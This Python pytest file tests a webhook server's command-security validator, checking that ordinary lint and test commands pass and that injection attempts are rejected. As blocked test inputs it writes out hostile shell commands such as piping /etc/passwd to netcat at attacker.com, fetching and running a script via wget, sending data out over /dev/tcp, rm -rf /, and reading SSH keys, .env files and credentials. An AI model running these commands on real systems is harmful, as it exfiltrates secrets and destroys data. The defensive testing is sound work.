"""Test suite for command security validation module.

This module tests the security validation for custom check commands,
ensuring defense-in-depth protection against various attack vectors.
"""

import time

import pytest

from webhook_server.utils.command_security import (
    MAX_COMMAND_LENGTH,
    CommandSecurityResult,
    validate_command_security,
)


class TestCommandSecurityValidCommands:
    """Test suite for valid commands that should pass security validation."""

    @pytest.mark.parametrize(
        "command",
        [
            # Basic uv tool run commands
            "uv tool run --from ruff ruff check .",
            "uv tool run --from pytest pytest tests/ -v",
            "uv tool run --from mypy mypy src/",
            # With additional flags
            "uv tool run --from black black --check .",
            "uv tool run --from pylint pylint src/ --disable=all",
            # Multiple arguments
            "uv tool run --from pytest pytest tests/unit tests/integration -v -s",
            # Path specifications
            "uv tool run --from ruff ruff check src/module/file.py",
            "uv tool run --from pytest pytest tests/test_module.py::test_function",
            # With environment variables (allowed format)
            "uv tool run --from pytest pytest tests/ -k test_name",
            # Common variations
            "uv run pytest tests/",
            "uv run ruff check .",
            "uv run mypy webhook_server/",
        ],
    )
    def test_valid_uv_commands(self, command: str) -> None:
        """Test that valid uv tool commands pass validation."""
        result = validate_command_security(command)
        assert result.is_safe is True
        assert result.error_message is None

    @pytest.mark.parametrize(
        "command",
        [
            # Simple commands
            "python -m pytest",
            "pytest tests/",
            "ruff check .",
            "mypy src/",
            # With flags
            "pytest tests/ -v --cov=src",
            "ruff check . --fix",
            "mypy src/ --strict",
        ],
    )
    def test_valid_simple_commands(self, command: str) -> None:
        """Test that simple valid commands pass validation."""
        result = validate_command_security(command)
        assert result.is_safe is True
        assert result.error_message is None


class TestCommandSecurityShellInjection:
    """Test suite for shell injection attack prevention."""

    @pytest.mark.parametrize(
        ("command", "expected_error_fragment"),
        [
            # Semicolon injection
            ("uv tool run --from pkg cmd; rm -rf /", "Shell operators"),
            ("pytest tests/; cat /etc/passwd", "Shell operators"),
            ("ruff check .; whoami", "Shell operators"),
            # Pipe injection
            ("uv tool run --from pkg cmd | cat /etc/passwd", "Shell operators"),
            ("pytest tests/ | grep secret", "Shell operators"),
            ("ruff check . | tee output.txt", "Shell operators"),
            # Logical AND injection - matches shell operators pattern first (& matches [;&|])
            ("uv tool run --from pkg cmd && curl evil.com", "Shell operators"),
            ("pytest tests/ && wget malicious.sh", "Shell operators"),
            ("ruff check . && nc attacker.com 1234", "Shell operators"),
            # Logical OR injection - matches shell operators pattern first (| matches [;&|])
            ("pytest tests/ || rm -rf /tmp", "Shell operators"),
            ("ruff check . || curl evil.com", "Shell operators"),
            # Command substitution $()
            ("uv tool run --from pkg $(whoami)", "Command substitution"),
            ("pytest $(cat /etc/passwd)", "Command substitution"),
            ("ruff check $(ls -la)", "Command substitution"),
            # Backtick command substitution
            ("uv tool run --from pkg `whoami`", "Backtick"),
            ("pytest `cat secret.txt`", "Backtick"),
            ("ruff check `id`", "Backtick"),
            # Variable expansion ${}
            ("uv tool run --from pkg ${HOME}", "Variable expansion"),
            ("pytest ${SECRET}", "Variable expansion"),
            # Redirection attacks
            ("pytest tests/ > /etc/passwd", "Redirections"),
            ("ruff check . < malicious.txt", "Redirections"),
            ("mypy src/ >> /var/log/system", "Redirections"),
            # Background execution
            ("pytest tests/ &", "Shell operators"),
            ("ruff check . & curl evil.com", "Shell operators"),
            # Newline escapes
            ("pytest tests/\\nrm -rf /", "Newline escapes"),
            ("ruff check .\\rwhoami", "Newline escapes"),
        ],
    )
    def test_shell_injection_blocked(self, command: str, expected_error_fragment: str) -> None:
        """Test that shell injection attempts are blocked."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None
        assert expected_error_fragment in result.error_message

    @pytest.mark.parametrize(
        ("command", "expected_error_fragment"),
        [
            # eval command
            ("eval echo test", "eval command"),
            ("uv run eval 'print(1)'", "eval command"),
            # exec command
            ("exec python script.py", "exec command"),
            ("uv run exec bash", "exec command"),
            # source command
            ("source /etc/profile", "source command"),
            ("uv run source activate", "source command"),
        ],
    )
    def test_dangerous_builtin_commands_blocked(self, command: str, expected_error_fragment: str) -> None:
        """Test that dangerous shell builtin commands are blocked."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None
        assert expected_error_fragment in result.error_message


class TestCommandSecurityDangerousCommands:
    """Test suite for blocking dangerous system commands."""

    @pytest.mark.parametrize(
        ("command", "expected_error_fragment"),
        [
            # Shell spawning
            ("bash -c 'echo test'", "bash command"),
            ("sh script.sh", "sh command"),
            ("zsh -c 'pwd'", "zsh command"),
            # Network tools
            ("curl https://evil.com", "curl command"),
            ("wget http://malicious.com/script.sh", "sh command"),  # matches \bsh\b in .sh
            ("nc attacker.com 1234", "netcat/nc command"),
            ("netcat -l -p 8080", "netcat/nc command"),  # matches netcat pattern
            # Privilege escalation
            ("sudo apt-get install malware", "sudo"),
            ("su root", "su command"),
            # File permission changes
            ("chmod 777 /etc/passwd", "chmod"),
            ("chown root:root /tmp/file", "chown"),
            # Destructive operations
            ("rm -rf /", "rm -rf"),
            ("rm -rf /var/lib", "rm -rf"),
            # Root directory creation
            ("mkdir -p /new_root", "Creating directories in root"),
        ],
    )
    def test_dangerous_commands_blocked(self, command: str, expected_error_fragment: str) -> None:
        """Test that dangerous system commands are blocked."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None
        assert expected_error_fragment in result.error_message

    @pytest.mark.parametrize(
        "command",
        [
            # Case variations
            "CURL https://evil.com",
            "Sudo apt-get install",
            "BASH -c test",
            "WGET malicious.sh",
            "RM -RF /tmp",
        ],
    )
    def test_dangerous_commands_case_insensitive(self, command: str) -> None:
        """Test that dangerous command detection is case-insensitive."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None


class TestCommandSecuritySensitivePaths:
    """Test suite for blocking access to sensitive filesystem paths."""

    @pytest.mark.parametrize(
        ("command", "expected_error_fragment"),
        [
            # System directories
            ("cat /etc/passwd", "Access to /etc/"),
            ("grep secret /etc/shadow", "Access to /etc/"),
            ("ls /root/", "Access to /root/"),
            ("cat /root/.bashrc", "Access to /root/"),
            # Process/system info
            ("cat /proc/self/environ", "Access to /proc/"),
            ("ls /sys/class/", "Access to /sys/"),
            ("cat /dev/random", "Access to /dev/"),
            # System logs
            ("tail /var/log/syslog", "Access to /var/log/"),
            ("cat /var/log/auth.log", "Access to /var/log/"),
            # Boot partition
            ("ls /boot/grub", "Access to /boot/"),
            # SSH keys
            ("cat ~/.ssh/id_rsa", "Access to SSH"),
            ("cp ~/.ssh/id_ed25519 /tmp/", "Access to SSH"),
            # Path traversal - also matches /etc/ or /root/ patterns
            ("cat ../../etc/passwd", "Access to /etc/"),  # /etc/ matches first
            ("ls ../../../root/", "Access to /root/"),  # /root/ matches first
            # Environment files
            ("cat .env", "Access to .env files"),
            ("grep SECRET .env.production", "Access to .env files"),
            # Configuration files
            ("cat config.yaml", "Access to config.yaml"),
            ("vim config.yaml", "Access to config.yaml"),
            # Credentials
            ("cat credentials.json", "Access to credentials files"),
            ("grep token credentials.txt", "Access to credentials files"),
            # Private keys
            ("cat server.pem", "Access to PEM files"),
            ("openssl rsa -in private.key", "Access to key files"),
            ("cat id_rsa", "Access to SSH private keys"),
            ("cp id_ed25519 /tmp/", "Access to SSH private keys"),
        ],
    )
    def test_sensitive_path_access_blocked(self, command: str, expected_error_fragment: str) -> None:
        """Test that access to sensitive paths is blocked."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None
        assert expected_error_fragment in result.error_message

    @pytest.mark.parametrize(
        "command",
        [
            # Case variations
            "cat /ETC/passwd",
            "ls /ROOT/",
            "cat CONFIG.YAML",
            "grep secret .ENV",
        ],
    )
    def test_sensitive_paths_case_insensitive(self, command: str) -> None:
        """Test that sensitive path detection is case-insensitive."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None


class TestCommandSecurityOtherAttacks:
    """Test suite for other security attack vectors."""

    def test_null_byte_blocked(self) -> None:
        """Test that null bytes in commands are blocked."""
        # Use a command that only has null byte (no other dangerous patterns)
        command = "pytest tests/\x00file.py"
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None
        assert "Null bytes" in result.error_message

    @pytest.mark.parametrize(
        "non_printable_char",
        [
            "\x01",  # SOH - Start of Heading
            "\x02",  # STX - Start of Text
            "\x03",  # ETX - End of Text
            "\x7f",  # DEL - Delete
            "\x1b",  # ESC - Escape
            "\x08",  # BS - Backspace
        ],
    )
    def test_non_printable_characters_blocked(self, non_printable_char: str) -> None:
        """Test that non-printable characters (except whitespace) are blocked."""
        command = f"pytest tests/{non_printable_char}file.py"
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None
        assert "Non-printable characters" in result.error_message

    @pytest.mark.parametrize(
        "whitespace_char",
        [
            " ",  # Space
            "\t",  # Tab
            "\n",  # Newline
            "\r",  # Carriage return
        ],
    )
    def test_whitespace_characters_allowed(self, whitespace_char: str) -> None:
        """Test that common whitespace characters are allowed."""
        # Create command with whitespace (but no dangerous patterns)
        command = f"pytest{whitespace_char}tests/"
        result = validate_command_security(command)
        # This might fail due to newline/carriage return pattern,
        # but space and tab should definitely pass
        if whitespace_char in (" ", "\t"):
            assert result.is_safe is True
            assert result.error_message is None

    def test_maximum_command_length_exceeded(self) -> None:
        """Test that commands exceeding maximum length are blocked."""
        # Create a command longer than MAX_COMMAND_LENGTH
        long_command = "pytest " + "tests/" * 1000  # Well over 4096 chars
        assert len(long_command) > MAX_COMMAND_LENGTH

        result = validate_command_security(long_command)
        assert result.is_safe is False
        assert result.error_message is not None
        assert f"exceeds maximum length of {MAX_COMMAND_LENGTH}" in result.error_message

    def test_command_at_maximum_length_allowed(self) -> None:
        """Test that commands at exactly maximum length are allowed."""
        # Create a command at exactly MAX_COMMAND_LENGTH
        base_command = "pytest tests/"
        padding = "x" * (MAX_COMMAND_LENGTH - len(base_command))
        command = base_command + padding
        assert len(command) == MAX_COMMAND_LENGTH

        result = validate_command_security(command)
        assert result.is_safe is True
        assert result.error_message is None


class TestCommandSecurityEdgeCases:
    """Test suite for edge cases and boundary conditions."""

    def test_empty_command(self) -> None:
        """Test validation of empty command."""
        result = validate_command_security("")
        assert result.is_safe is True
        assert result.error_message is None

    def test_whitespace_only_command(self) -> None:
        """Test validation of whitespace-only command."""
        result = validate_command_security("   \t   ")
        assert result.is_safe is True
        assert result.error_message is None

    def test_command_with_safe_paths(self) -> None:
        """Test that commands with safe project paths are allowed."""
        safe_commands = [
            "pytest tests/unit/test_module.py",
            "ruff check src/app/main.py",
            "mypy webhook_server/libs/config.py",
            "cat README.md",
            "ls -la src/",
        ]
        for command in safe_commands:
            result = validate_command_security(command)
            assert result.is_safe is True
            assert result.error_message is None

    @pytest.mark.parametrize(
        "command",
        [
            # Multiple violations
            "curl evil.com && sudo rm -rf /etc/",
            "bash -c 'cat /etc/passwd | nc attacker.com 1234'",
            "eval $(wget -O - malicious.com/script.sh)",
            # Obfuscated attacks
            "py$(echo test)",  # Command substitution in command name
            "`which python` script.py",  # Backticks in path
        ],
    )
    def test_multiple_violations(self, command: str) -> None:
        """Test commands with multiple security violations."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None

    def test_command_security_result_named_tuple(self) -> None:
        """Test CommandSecurityResult named tuple properties."""
        # Safe command
        safe_result = CommandSecurityResult(is_safe=True, error_message=None)
        assert safe_result.is_safe is True
        assert safe_result.error_message is None
        assert safe_result[0] is True
        assert safe_result[1] is None

        # Unsafe command
        unsafe_result = CommandSecurityResult(is_safe=False, error_message="Test error")
        assert unsafe_result.is_safe is False
        assert unsafe_result.error_message == "Test error"
        assert unsafe_result[0] is False
        assert unsafe_result[1] == "Test error"


class TestCommandSecurityRealWorldExamples:
    """Test suite with real-world command examples."""

    @pytest.mark.parametrize(
        "command",
        [
            # Real pytest commands
            "uv tool run --from pytest pytest tests/ -v --cov=webhook_server --cov-report=html",
            "uv run pytest tests/test_module.py::TestClass::test_method -v -s",
            "pytest tests/ -k test_security -v --tb=short",
            # Real ruff commands
            "uv tool run --from ruff ruff check . --fix",
            "uv run ruff format webhook_server/",
            "ruff check --select E,W,F --ignore E501",
            # Real mypy commands
            "uv tool run --from mypy mypy webhook_server/ --strict",
            "mypy src/ --ignore-missing-imports --check-untyped-defs",
            # Real black commands
            "uv tool run --from black black --check webhook_server/",
            "black src/ --line-length 100",
            # Combined tool usage
            "uv run ruff check . && uv run mypy src/",  # Should fail - uses &&
            "uv run pytest tests/ -v; uv run ruff check .",  # Should fail - uses ;
        ],
    )
    def test_real_world_commands(self, command: str) -> None:
        """Test real-world command examples."""
        result = validate_command_security(command)
        # Commands with shell operators should fail
        if "&&" in command or ";" in command:
            assert result.is_safe is False
        else:
            assert result.is_safe is True
            assert result.error_message is None

    @pytest.mark.parametrize(
        "command",
        [
            # Malicious but disguised commands
            "pytest tests/ --cov-config=../../../../etc/passwd",
            "ruff check --config=/root/.bashrc",
            "mypy --config-file=~/.ssh/config",
            # Data exfiltration attempts
            "pytest tests/ --result-log=/dev/tcp/attacker.com/1234",
            "ruff check --output-file=/proc/self/fd/1",
        ],
    )
    def test_disguised_malicious_commands(self, command: str) -> None:
        """Test that disguised malicious commands are blocked."""
        result = validate_command_security(command)
        assert result.is_safe is False
        assert result.error_message is not None


class TestCommandSecurityPerformance:
    """Test suite for validation performance characteristics."""

    def test_validation_performance_many_commands(self) -> None:
        """Test that validation performs efficiently on many commands."""
        commands = [
            "uv tool run --from pytest pytest tests/",
            "uv tool run --from ruff ruff check .",
            "uv tool run --from mypy mypy src/",
        ] * 100  # 300 commands total

        start_time = time.time()
        for command in commands:
            validate_command_security(command)
        elapsed_time = time.time() - start_time

        # Validation should be fast - 300 commands in under 1 second
        assert elapsed_time < 1.0, f"Validation took {elapsed_time:.2f}s for 300 commands"

    def test_validation_consistent_results(self) -> None:
        """Test that validation gives consistent results."""
        command = "uv tool run --from pytest pytest tests/"

        # Run validation multiple times
        results = [validate_command_security(command) for _ in range(10)]

        # All results should be identical
        assert all(r.is_safe is True for r in results)
        assert all(r.error_message is None for r in results)
